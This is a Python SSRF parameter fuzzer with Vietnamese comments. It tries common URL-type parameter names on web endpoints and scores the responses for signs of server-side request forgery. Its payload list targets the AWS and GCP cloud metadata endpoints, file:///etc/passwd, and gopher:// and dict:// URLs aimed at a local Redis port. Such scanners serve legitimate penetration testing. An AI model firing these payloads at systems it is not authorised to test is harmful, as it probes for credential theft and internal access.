"""
Parameter Fuzzer
Tự động fuzzing để tìm hidden parameters (đặc biệt SSRF-prone params)
"""

import requests
from typing import List, Dict, Set
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse, parse_qs

class ParameterFuzzer:
    """Fuzzing parameters để tìm SSRF"""
    
    # Parameters thường gặp trong SSRF
    SSRF_PARAMETERS = [
        'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'link',
        'callback', 'callback_url', 'callbackUrl', 'return_url', 'returnUrl',
        'webhook', 'webhook_url', 'webhookUrl', 'notify_url', 'notifyUrl',
        'target', 'target_url', 'targetUrl', 'host', 'proxy', 'fetch',
        'load', 'import', 'download', 'file', 'document', 'reference', 'ref',
        'next', 'continue', 'view', 'to', 'goto', 'out', 'checkout',
        'image', 'img', 'picture', 'avatar', 'icon', 'logo', 'banner',
        'feed', 'rss', 'api', 'endpoint', 'service', 'resource'
    ]
    
    # Test values để detect SSRF
    TEST_PAYLOADS = [
        'http://example.com',
        'https://example.com',
        'http://127.0.0.1',
        'http://localhost',
        'http://169.254.169.254',  # AWS metadata
        'http://metadata.google.internal',  # GCP metadata
        'file:///etc/passwd',
        'dict://localhost:6379',
        'gopher://localhost:6379'
    ]
    
    def __init__(self, timeout: int = 10, threads: int = 5):
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.vulnerable_params = []
    
    def fuzz_endpoint(self, url: str, method: str = 'GET') -> List[Dict]:
        """Fuzz một endpoint cụ thể"""
        results = []
        
        print(f"[*] Fuzzing {url} with {len(self.SSRF_PARAMETERS)} parameters...")
        
        # Test từng parameter
        for param in self.SSRF_PARAMETERS:
            result = self._test_parameter(url, param, method)
            if result:
                results.append(result)
                print(f"[+] Found parameter: {param}")
        
        return results
    
    def _test_parameter(self, url: str, param: str, method: str) -> Dict:
        """Test một parameter cụ thể"""
        # Baseline request (không có parameter)
        try:
            if method.upper() == 'GET':
                baseline = self.session.get(url, timeout=self.timeout)
            else:
                baseline = self.session.post(url, timeout=self.timeout)
            
            baseline_status = baseline.status_code
            baseline_length = len(baseline.content)
            baseline_time = baseline.elapsed.total_seconds()
        except:
            return None
        
        # Test với parameter
        findings = []
        
        for payload in self.TEST_PAYLOADS:
            try:
                if method.upper() == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    response = self.session.post(
                        url,
                        data={param: payload},
                        timeout=self.timeout
                    )
                
                # Analyze response
                diff_status = response.status_code != baseline_status
                diff_length = abs(len(response.content) - baseline_length) > 50
                diff_time = abs(response.elapsed.total_seconds() - baseline_time) > 2
                
                # Indicators of SSRF
                indicators = []
                
                if diff_status or diff_length or diff_time:
                    indicators.append('response_diff')
                
                # Check for error messages
                content = response.text.lower()
                error_keywords = [
                    'connection refused', 'connection timeout', 'timeout',
                    'could not resolve', 'dns', 'unreachable',
                    'failed to connect', 'network error',
                    'invalid url', 'malformed url'
                ]
                
                for keyword in error_keywords:
                    if keyword in content:
                        indicators.append(f'error_message:{keyword}')
                        break
                
                # Check for reflected payload
                if payload in response.text:
                    indicators.append('payload_reflected')
                
                if indicators:
                    findings.append({
                        'payload': payload,
                        'status_code': response.status_code,
                        'indicators': indicators,
                        'response_time': response.elapsed.total_seconds()
                    })
            
            except requests.exceptions.Timeout:
                findings.append({
                    'payload': payload,
                    'status_code': 'TIMEOUT',
                    'indicators': ['timeout'],
                    'response_time': self.timeout
                })
            except Exception as e:
                # Connection errors có thể là dấu hiệu của SSRF
                if 'connection' in str(e).lower():
                    findings.append({
                        'payload': payload,
                        'status_code': 'ERROR',
                        'indicators': ['connection_error'],
                        'error': str(e)
                    })
        
        # Nếu có findings → parameter có thể vulnerable
        if findings:
            confidence = self._calculate_confidence(findings)
            
            return {
                'parameter': param,
                'url': url,
                'method': method,
                'findings': findings,
                'confidence': confidence,
                'is_vulnerable': confidence >= 0.5
            }
        
        # Even without findings, if parameter name is HIGHLY suspicious, report it
        high_risk_keywords = ['callback_url', 'webhook_url', 'redirect_url', 'url', 'uri']
        if any(keyword == param.lower() for keyword in high_risk_keywords):
            # Parameter accepted without errors - report as suspicious
            return {
                'parameter': param,
                'url': url,
                'method': method,
                'findings': [{
                    'payload': 'test',
                    'indicators': ['parameter_accepted_by_name'],
                    'note': 'Parameter name matches known SSRF patterns'
                }],
                'confidence': 0.4,  # Medium-low confidence without behavioral proof
                'is_vulnerable': False
            }
        
        return None
    
    def _calculate_confidence(self, findings: List[Dict]) -> float:
        """Tính confidence score (0-1)"""
        score = 0.0
        total_tests = len(self.TEST_PAYLOADS)
        
        for finding in findings:
            indicators = finding.get('indicators', [])
            
            # High confidence indicators
            if 'timeout' in indicators:
                score += 0.3
            if any('error_message' in i for i in indicators):
                score += 0.25
            if 'connection_error' in indicators:
                score += 0.2
            if 'response_diff' in indicators:
                score += 0.15
            if 'payload_reflected' in indicators:
                score += 0.1
        
        # Normalize
        confidence = min(score / total_tests, 1.0)
        return confidence
    
    def smart_fuzz(self, urls: List[str]) -> List[Dict]:
        """Fuzz multiple URLs với priority"""
        all_results = []
        
        # Priority endpoints (API endpoints có khả năng cao)
        priority_keywords = ['api', 'callback', 'webhook', 'proxy', 'fetch']
        
        priority_urls = [
            url for url in urls 
            if any(keyword in url.lower() for keyword in priority_keywords)
        ]
        
        other_urls = [url for url in urls if url not in priority_urls]
        
        print(f"[*] Priority URLs: {len(priority_urls)}")
        print(f"[*] Other URLs: {len(other_urls)}")
        
        # Test priority URLs first
        for url in priority_urls:
            results = self.fuzz_endpoint(url)
            all_results.extend(results)
        
        # Then test others
        for url in other_urls[:20]:  # Limit to avoid too many requests
            results = self.fuzz_endpoint(url)
            all_results.extend(results)
        
        return all_results
    
    def analyze_existing_params(self, url: str) -> List[Dict]:
        """Phân tích parameters đã có sẵn trong URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        results = []
        
        for param_name, param_values in params.items():
            # Check if parameter name suggests SSRF
            is_suspicious = any(
                keyword in param_name.lower() 
                for keyword in ['url', 'uri', 'callback', 'webhook', 'redirect']
            )
            
            if is_suspicious:
                result = self._test_parameter(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    param_name,
                    'GET'
                )
                if result:
                    results.append(result)
        
        return results

if __name__ == "__main__":
    # Test
    fuzzer = ParameterFuzzer()
    results = fuzzer.fuzz_endpoint("http://localhost:8083/inventory/1/M")
    
    print(f"\n[+] Found {len(results)} potential SSRF parameters:")
    for result in results:
        confidence = result['confidence']
        status = "VULNERABLE" if result['is_vulnerable'] else "SUSPICIOUS"
        print(f"  [{status}] {result['parameter']} (confidence: {confidence:.2f})")
